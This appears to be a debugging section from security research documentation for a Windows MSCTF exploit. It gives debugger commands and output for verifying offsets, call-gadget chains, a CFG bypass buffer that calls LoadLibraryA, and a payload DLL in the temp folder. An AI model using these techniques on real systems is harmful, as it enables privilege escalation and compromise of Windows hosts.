## Debugging

Here is how I debug problems with the exploit.

```$ cdb notepad.exe```

Disable first chance AV and BPE exceptions, because there are a lot of them.

```
> sxd av
> sxd bpe
> g
```

Then do this in ctftool

```
ctf> connect
ctf> wait notepad.exe
ctf> script scripts\ctf-exploit-common-win10.ctf
```

### Things to check

* Are the offsets still correct?
```
0:000> ? msvcrt!_init_time - msvcrt
Evaluate expression: 204080 = 00000000`00031d30
0:000> ? combase!CStdProxyBuffer_CF_AddRef - combase
Evaluate expression: 2023984 = 00000000`001ee230
0:000> ? KERNEL32!LoadLibraryAStub - kernel32
Evaluate expression: 125792 = 00000000`0001eb60
0:000> ? msctf!CCompartmentEventSink::`vftable' - msctf
Evaluate expression: 991272 = 00000000`000f2028
0:000> ? MSCTF!CCompartmentEventSink::OnChange - msctf 
Evaluate expression: 798752 = 00000000`000c3020
0:000> dqs msctf!CCompartmentEventSink::`vftable' L4
00007ffd`04312028  00007ffd`04243d00 MSCTF!CCompartmentEventSink::QueryInterface
00007ffd`04312030  00007ffd`04262840 MSCTF!CCompartmentEventSink::AddRef
00007ffd`04312038  00007ffd`0425c940 MSCTF!CCompartmentEventSink::Release
00007ffd`04312040  00007ffd`042e3020 MSCTF!CCompartmentEventSink::OnChange
0:000> dqs MSCTF!CStubIEnumTfInputProcessorProfiles::_StubTbl + 0n496*8 L
00007ffd`1aee6440 MSCTF!CTipProxy::Reconvert
```

* Did the buffer get built correctly?

```
0:000> dqs kernel32 + a9008 L8
00007ffd`03df9008  00007ffd`03df9008 KERNEL32!g_Upload16BitCriticalSection+0x128
00007ffd`03df9010  00007ffd`042e3020 MSCTF!CCompartmentEventSink::OnChange
00007ffd`03df9018  00000000`00000000
00007ffd`03df9020  00000000`00000000
00007ffd`03df9028  00000000`00000000
00007ffd`03df9030  00000000`00000000
00007ffd`03df9038  00007ffd`03d6eb60 KERNEL32!LoadLibraryAStub
00007ffd`03df9040  00007ffd`03df9048 KERNEL32!g_Upload16BitCriticalSection+0x168
0:000> da kernel32 + a9008 + 8*8
00007ffd`03df9048  "..\TEMP\EXPLOIT"
```

* Are the gadgets different?

```
0:000> u MSCTF!CCompartmentEventSink::OnChange 
MSCTF!CCompartmentEventSink::OnChange:
00007ffd`042e3020 488b4130        mov     rax,qword ptr [rcx+30h]
00007ffd`042e3024 488b4938        mov     rcx,qword ptr [rcx+38h]
00007ffd`042e3028 48ff25718a0300  jmp     qword ptr [MSCTF!_guard_dispatch_icall_fptr (00007ffd`0431baa0)]
0:000> u combase!CStdProxyBuffer_CF_AddRef 
combase!CStdProxyBuffer_CF_AddRef:
00007ffd`02e1e230 488b49c8        mov     rcx,qword ptr [rcx-38h]
00007ffd`02e1e234 488b01          mov     rax,qword ptr [rcx]
00007ffd`02e1e237 488b4008        mov     rax,qword ptr [rax+8]
00007ffd`02e1e23b 48ff254e5d0700  jmp     qword ptr [combase!__guard_dispatch_icall_fptr (00007ffd`02e93f90)]
```

* Did the CFG whitelist change?

```C:\> dumpbin /headers /loadconfig```

* Is the payload DLL accessible?

```C:\> icacls %WINDIR%\temp\exploit.dll```

* Is the payload DLL working?

```C:\> rundll32 %WINDIR%\temp\exploit.dll,test```
